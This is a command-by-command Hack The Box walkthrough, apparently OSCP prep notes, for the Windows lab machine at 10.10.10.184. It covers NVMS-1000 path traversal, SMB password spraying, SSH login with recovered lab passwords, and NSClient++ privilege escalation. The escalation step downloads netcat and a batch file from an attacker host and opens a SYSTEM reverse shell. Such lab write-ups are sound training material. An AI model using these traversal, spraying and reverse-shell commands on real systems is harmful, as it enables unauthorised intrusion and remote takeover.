## 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP.md)


## 🔎 Recon

```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.184
nmap -sV -sC -p 21,22,80,135,139,445,5040,5666,6063,6699,7680,8443 -oA scans/nmap-tcpscripts 10.10.10.184
```

---

## 📁 [FTP](FTP) Enumeration

```bash
wget -r ftp://anonymous:@10.10.10.184
find ftp/ -type f
cat ftp/Users/Nadine/Confidential.txt
cat ftp/Users/Nathan/Notes\ to\ do.txt
```

---

## 🌐 [Web](HTTP) (TCP 80) – NVMS-1000

```bash
searchsploit "nvms 1000"
# Test LFI
curl 'http://10.10.10.184/../../../../../../../../../../../../windows/win.ini'
# Use traversal to read passwords.txt
curl 'http://10.10.10.184/../../../../../../../../../../../../Users/Nathan/Desktop/passwords.txt'
```

---

## 🔓 Credential Testing

```bash
# Create users.txt and passwords.txt
cat > users <<EOF
administrator
nathan
nadine
EOF

cat > passwords <<EOF
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
EOF

crackmapexec smb 10.10.10.184 -u users -p passwords
```

---

## 🐚 Shell as Nadine [SSH](SSH)

```bash
sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@10.10.10.184
```

---

## 🔐 NSClient++ Enumeration & Tunnel

```bash
# Display password from inside SSH shell
nscp web -- password --display

# Local tunnel to access 127.0.0.1:8443
sshpass -p 'L1k3B1gBut7s@W0rk' ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
```

---

## 🧨 NSClient++ Exploitation Steps

```bash
# Attacker box: prepare reverse shell payload
echo '\programdata\nc.exe 10.10.14.24 443 -e cmd' > shell.bat
python3 -m http.server 80

# Target box: download tools
powershell wget http://10.10.14.24/nc64.exe -outfile nc.exe
powershell wget http://10.10.14.24/shell.bat -outfile shell.bat
```

Then on NSClient++ web GUI (via https://127.0.0.1:8443):
- Add external script `df` → `C:\\programdata\\shell.bat`
- Add schedule to run `df` every 10s
- Control → Reload

---

## 🖥️ Catch SYSTEM Shell

```bash
rlwrap nc -lvnp 443
# Wait for reverse shell
```